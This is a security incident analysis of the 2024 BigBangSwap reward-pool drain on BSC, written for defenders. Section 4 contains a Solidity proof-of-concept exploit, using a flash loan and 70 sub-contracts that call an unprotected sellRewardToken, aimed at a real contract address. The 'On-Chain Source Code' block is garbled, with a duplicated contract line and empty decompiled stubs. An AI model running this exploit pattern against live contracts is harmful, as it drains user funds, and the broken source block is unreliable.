# BigBangSwap — sellRewardToken Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | BigBangSwap (BGG) |
| **Chain** | BSC |
| **Loss** | ~5,000 BUSD |
| **Attacker** | [0xc1b6f989](https://bscscan.com/address/0xc1b6f9898576d722dbf604aaa452cfea3a639c59) |
| **Attack Contract** | [0xb22cf0e1](https://bscscan.com/address/0xb22cf0e1672344f23f3126fbd35f856e961fd780) |
| **Vulnerable Contract** | [TransparentProxy 0xa45D4359](https://bscscan.com/address/0xa45D4359246DBD523Ab690Bef01Da06B07450030) |
| **BGG Token** | [0xaC4d2F22](https://bscscan.com/address/0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF) |
| **LP Pool (Pancake)** | [0x218674fc](https://bscscan.com/address/0x218674fc1df16B5d4F0227A59a2796f13FEbC5f2) |
| **LP Pool (SwapRouter)** | [0x68E465A8](https://bscscan.com/address/0x68E465A8E65521631f36404D9fB0A6FaD62A3B37) |
| **Root Cause** | `sellRewardToken(uint256 amount)` has no access control, allowing anyone to sell BGG for BUSD; the reward pool was drained via repeated calls from multiple attack contract instances |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/BigBangSwap_exp.sol) |

---

## 1. Vulnerability Overview

The `sellRewardToken()` function exposed by BigBangSwap's `TransparentUpgradeableProxy` can be called by anyone without access control, enabling the forced sale of BGG token rewards held by the contract into BUSD. The attacker borrowed 50 BUSD via a DODO flash loan, deployed 70 attack contracts, and drained the entire reward pool through repeated calls.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: sellRewardToken has no access control
contract BigBangSwapProxy {
    // No onlyOwner — anyone can sell reward tokens
    function sellRewardToken(uint256 amount) external {
        // Executes BGG → BUSD sell logic
        IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,  // BGG → BUSD
            msg.sender,  // ← rewards sent to caller
            block.timestamp
        );
    }
}

// ✅ Safe code: only owner can sell reward tokens
function sellRewardToken(uint256 amount) external onlyOwner {
    require(amount <= rewardBalance, "exceeds reward balance");
    IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount, 0, path, owner(), block.timestamp
    );
    emit RewardSold(amount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: BigBangSwap_decompiled.sol
contract BigBangSwap {
contract BigBangSwap {
    address public owner;


    // Selector: 0x1b2ce7f3
    function unknown_1b2ce7f3() external {}  // ❌ Vulnerability

    // Selector: 0x278f7943
    function unknown_278f7943() external {}

    // Selector: 0x08f28397
    function unknown_08f28397() external {}

    // Selector: 0x03e14691
    function unknown_03e14691() external {}

    // Selector: 0x5c60da1b
    function implementation() external {}

    // Selector: 0x4e487b71
    function Panic(uint256 p0) external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO Flash Loan: borrow 50 BUSD
  │
  ├─→ [2] Deploy 70 attack contracts
  │
  ├─→ [3] Each instance:
  │         ├─ Swap BUSD → BGG (PancakeRouter)
  │         └─ Call sellRewardToken(amount) → BUSD returned
  │
  ├─→ [4] BGG reward pool drained through repeated execution
  │
  ├─→ [5] Repay DODO flash loan
  │
  └─→ [6] ~5,000 BUSD profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ITransparentProxy {
    function sellRewardToken(uint256 amount) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract AttackContract {
    ITransparentProxy constant proxy  = ITransparentProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);
    IDPPAdvanced      constant dodo   = IDPPAdvanced(/* DODO DPP */);
    IERC20            constant BUSD   = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20            constant BGG    = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);

    function testExploit() external {
        // [1] Flash loan 50 BUSD
        dodo.flashLoan(0, 50e18, address(this), abi.encode("flashloan"));
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        // [2] Deploy + execute 70 attack contracts
        for (uint i = 0; i < 70; i++) {
            SubAttack sub = new SubAttack();
            BUSD.transfer(address(sub), quoteAmount / 70);
            sub.attack();
        }

        // [3] Repay flash loan
        BUSD.transfer(address(dodo), quoteAmount);
    }
}

contract SubAttack {
    ITransparentProxy constant proxy = ITransparentProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    function attack() external {
        // Swap BUSD → BGG
        uint256 bggBal = swapBUSDtoBGG(BUSD.balanceOf(address(this)));

        // Call sellRewardToken with no access control
        BGG.approve(address(proxy), bggBal);
        proxy.sellRewardToken(bggBal);  // BUSD returned to this contract

        // Transfer BUSD back to attacker
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control (reward sell function) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (repeated calls to sellRewardToken) |
| **DApp Category** | DEX + Reward Contract |
| **Impact** | Full reward pool drained (~5,000 BUSD) |

## 6. Remediation Recommendations

1. **sellRewardToken onlyOwner**: Restrict the reward sell function to owner-only access
2. **Maximum sell amount cap**: Set an upper limit on the amount that can be sold per single call
3. **Proxy function audit**: Review access control for all functions exposed by the TransparentUpgradeableProxy
4. **Timelock enforcement**: Add timelock delays to reward distribution parameter changes

## 7. Lessons Learned

- Functions exposed by upgradeable proxies require access control in the same way as regular contracts.
- The reward sell function should only be callable from within internal protocol flows; direct external calls must not be permitted.
- Deploying many small attack contracts is a standard technique to bypass per-contract access restrictions.